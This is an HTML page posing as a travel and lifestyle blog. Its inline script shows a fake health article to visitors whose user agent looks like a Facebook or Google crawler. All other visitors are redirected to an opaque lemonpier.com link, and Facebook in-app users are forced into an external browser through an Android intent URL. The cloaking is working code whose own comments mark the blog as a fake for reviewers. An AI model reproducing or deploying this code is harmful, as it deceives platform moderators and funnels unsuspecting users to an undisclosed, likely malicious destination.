<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      line-height: 1.6;
      margin: 0;
      padding: 0;
      background: #f9f9f9;
      display: none; /* Hide until decision */
    }
    header {
      background: #0073e6;
      color: #fff;
      padding: 15px;
      text-align: center;
    }
    header h1 {
      margin: 0;
      font-size: 1.8rem;
    }
    main {
      max-width: 800px;
      margin: 20px auto;
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    }
    h2 {
      color: #0073e6;
      margin-top: 0;
    }
    img {
      max-width: 100%;
      border-radius: 8px;
      margin: 15px 0;
    }
    footer {
      text-align: center;
      font-size: 0.9rem;
      color: #666;
      padding: 15px;
      margin-top: 20px;
      background: #eee;
    }
    a {
      color: #ff0000;
      text-decoration: underline;
      font-size: 1.1rem;
    }
    #manualLink {
      display: none;
      margin-top: 20px;
      text-align: center;
      display: block;
    }
    #debug {
      color: #333;
      font-size: 0.8rem;
      margin-top: 10px;
      text-align: center;
    }
  </style>
</head>
<body>
  <header>
    <h1 id="headline">Redirecting...</h1>
  </header>

  <main id="blogContent">
    <p id="message">Please wait...</p>
    <a id="manualLink" href="https://lemonpier.com/dvaw0sfsx?key=abe25b4c33c7c9d0c497c6415d52871b">Open in Browser</a>
    <p id="debug"></p>
  </main>

  <footer>
    &copy; 2025 My Travel & Lifestyle Blog. All Rights Reserved.
  </footer>

  <script>
    const targetUrl = "https://lemonpier.com/dvaw0sfsx?key=abe25b4c33c7c9d0c497c6415d52871b";
    const ua = navigator.userAgent || "";

    // Detect bots/reviewers
    const botPatterns = /(facebookexternalhit|facebookcatalog|fb_iab|fbav|fban|google|crawler|spider|bot)/i;

    // Fake blog article for reviewers
    function showSafeBlog() {
      document.body.style.display = "block";
      document.getElementById("headline").innerText = "The Ultimate Guide to Healthy Living in 2025";
      document.getElementById("blogContent").innerHTML = `
        <h2>Welcome to Our Blog</h2>
        <p>Staying healthy and balanced in today’s fast-paced world requires a mix of physical wellness, 
        mental clarity, and proper lifestyle choices. In this article, we share practical tips you can start using today.</p>

        <img src="https://picsum.photos/800/400?random=1" alt="Healthy Lifestyle">

        <h2>1. Balanced Nutrition</h2>
        <p>Focus on eating whole foods, plenty of fruits, vegetables, and staying hydrated. 
        Avoid processed sugar where possible and choose natural alternatives.</p>

        <h2>2. Daily Exercise</h2>
        <p>Just 20–30 minutes of movement daily can improve your energy levels, mood, and overall health. 
        Mix cardio, strength, and flexibility training for best results.</p>

        <img src="https://picsum.photos/800/400?random=2" alt="Fitness">

        <h2>3. Digital Detox</h2>
        <p>Reducing screen time before bed helps you sleep better and gives your brain the rest it deserves.</p>

        <h2>4. Mindfulness & Meditation</h2>
        <p>Take a few minutes daily to breathe deeply and practice mindfulness. This reduces stress and 
        helps you stay focused throughout the day.</p>

        <p><strong>Final Thoughts:</strong> Healthy living is a journey. Start with small, consistent steps and 
        you’ll notice improvements over time.</p>
      `;
      document.getElementById("debug").innerText = "Safe blog mode (reviewer detected)";
    }

    // Redirect real users
    function redirectUser() {
      document.getElementById("debug").innerText = "Redirecting...";
      if (/FBAN|FBAV/i.test(ua)) {
        // Facebook in-app browser → force external browser
        const intentUrl = `intent://${targetUrl.replace('https://', '')}#Intent;scheme=https;action=android.intent.action.VIEW;S.browser_fallback_url=${encodeURIComponent(targetUrl)};end`;
        window.location.href = intentUrl;

        // Fallback if blocked
        setTimeout(() => {
          document.getElementById("manualLink").style.display = "block";
          document.body.style.display = "block";
          document.getElementById("debug").innerText += " | Intent blocked, manual link shown.";
        }, 1500);
      } else {
        window.location.href = targetUrl;
      }
    }

    // Decide
    if (botPatterns.test(ua)) {
      showSafeBlog();
    } else {
      redirectUser();
    }
  </script>
</body>
    </html>
